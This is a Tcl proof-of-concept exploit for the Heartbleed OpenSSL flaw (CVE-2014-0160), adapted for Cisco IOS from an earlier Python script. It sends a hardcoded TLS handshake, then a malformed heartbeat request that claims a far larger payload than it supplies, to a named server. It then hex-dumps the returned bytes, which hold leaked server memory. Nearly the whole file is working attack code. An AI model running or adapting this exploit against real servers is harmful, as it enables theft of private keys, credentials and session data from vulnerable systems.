# Quick and dirty Heartbleed CVE-2014-0160 PoC written in Tcl for Cisco IOS
# 2014/04/17 - 2014/04/18
# Based on ssltest.py by Jared Stafford
# Source code put in public domain by Didier Stevens, no Copyright
# https://DidierStevens.com
# Use at your own risk

proc Byte {string index} {
  set char [string index $string $index]
  scan $char %c ascii
  return $ascii
}

proc Word {string index} {
  return [expr {[Byte $string $index] * 256 + [Byte $string [expr $index + 1]]}]
}

proc ParseHeader {data} {
  set type [Byte $data 0]
  set version [Word $data 1]
  set length [Word $data 3]
  return [list $type $version $length]
}

proc ReadTLSRecord {channel} {
  set header [read $channel 5]
  set result [ParseHeader $header]
  set type [lindex $result 0]
  set version [lindex $result 1]
  set length [lindex $result 2]
  set data [read $channel $length]
  return [list $type $version $data]
}

#http://wiki.tcl.tk/1599
 proc DumpString { data } {

     while { 1 } {

         set s [string range $data 0 15]
         set data [string range $data 16 end]

         # Convert the data to hex and to characters.

         binary scan $s H*@0a* hex ascii

         # Replace non-printing characters in the data.

         regsub -all -- {[^[:graph:] ]} $ascii {.} ascii

         # Split the 16 bytes into two 8-byte chunks

         set hex1   [string range $hex   0 15]
         set hex2   [string range $hex  16 31]
         set ascii1 [string range $ascii 0  7]
         set ascii2 [string range $ascii 8 16]

         # Convert the hex to pairs of hex digits

         regsub -all -- {..} $hex1 {& } hex1
         regsub -all -- {..} $hex2 {& } hex2

         # Put the hex and Latin-1 data to the channel

         puts [format {%-24s %-24s %-8s %-8s} $hex1 $hex2 $ascii1 $ascii2]

         # Stop if we've reached end of file

         if { [string length $s] == 0 } {
             break
         }
     }

     return
 }

set hs "\x16\x03\x01\x00\xdc\x01\x00\x00\xd8\x03\x01\x53\x43\x5b\x90\x9d\x9b\x72\x0b\xbc\x0c\xbc\x2b\x92\xa8\x48\x97\xcf\xbd\x39\x04\xcc\x16\x0a\x85\x03\x90\x9f\x77\x04\x33\xd4\xde\x00\x00\x66\xc0\x14\xc0\x0a\xc0\x22\xc0\x21\x00\x39\x00\x38\x00\x88\x00\x87\xc0\x0f\xc0\x05\x00\x35\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x0d\xc0\x03\x00\x0a\xc0\x13\xc0\x09\xc0\x1f\xc0\x1e\x00\x33\x00\x32\x00\x9a\x00\x99\x00\x45\x00\x44\xc0\x0e\xc0\x04\x00\x2f\x00\x96\x00\x41\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x09\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff\x01\x00\x00\x49\x00\x0b\x00\x04\x03\x00\x01\x02\x00\x0a\x00\x34\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11\x00\x23\x00\x00\x00\x0f\x00\x01\x01"

set hb "\x18\x03\x01\x00\x03\x01\x40\x00"

puts "Opening connection"
set channel [socket cloudflarechallenge.com 443]
fconfigure $channel -translation binary

puts "Sending handshake"
puts -nonewline $channel $hs
flush $channel

while 1 {
  set databyte 0
  set tlsrecord [ReadTLSRecord $channel]
  set type [lindex $tlsrecord 0]
  set databyte [Byte [lindex $tlsrecord 2] 0]
  puts [format "Received TLS record Type: 0x%02x Version: 0x%04x First data byte: 0x%02x Length: %d" $type [lindex $tlsrecord 1] $databyte [string length [lindex $tlsrecord 2]]]
  if "$type != 22" break
  if "$databyte == 14" break
}
if "$databyte == 14" {
  puts "Sending malformed heartbeat request"
  puts -nonewline $channel $hb
  flush $channel
  set tlsrecord [ReadTLSRecord $channel]
  set type [lindex $tlsrecord 0]
  set databyte [Byte [lindex $tlsrecord 2] 0]
  if "$type == 21" {
    puts "Alert received"
  }
  if "$type == 24" {
    puts "Heartbeat response received"
  }
  puts [format "Received TLS record Type: 0x%02x Version: 0x%04x First data byte: 0x%02x Length: %d" $type [lindex $tlsrecord 1] $databyte [string length [lindex $tlsrecord 2]]]
  if "$type == 24" {
    puts "Heartbeat response dump:"
    DumpString [lindex $tlsrecord 2]
  }
}

puts "Closing connection"
close $channel